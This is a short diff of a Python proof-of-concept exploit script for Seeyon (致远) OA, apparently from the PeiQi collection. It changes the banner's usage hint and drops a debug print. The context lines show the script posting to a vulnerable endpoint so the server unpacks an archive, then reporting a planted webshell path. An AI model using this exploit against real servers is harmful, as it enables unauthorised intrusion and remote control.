@@ -14,7 +14,7 @@ def title():
     print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
     print('+  \033[34mVersion: 致远OA                                                   \033[0m')
     print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
-    print('+  \033[36mFile         >>> ip.txt                                             \033[0m')
+    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                                \033[0m')
     print('+------------------------------------------')
 
 
@@ -60,7 +60,6 @@ def POC_2(target_url, cookie, reg, headers):
     print("\033[32m[o] 目标 {} 正在解压文件.... \033[0m".format(target_url))
     try:
         response = requests.post(vuln_url, data=post, headers=headers, timeout=60, verify=False)
-        print(response.text)
         if response.status_code == 500:
             print("\033[32m[o] 目标 {} 解压文件成功.... \033[0m".format(target_url))
             print("\033[32m[o] 默认Webshell地址: {}/seeyon/common/designer/pageLayout/peiqi10086.jsp \033[0m".format(
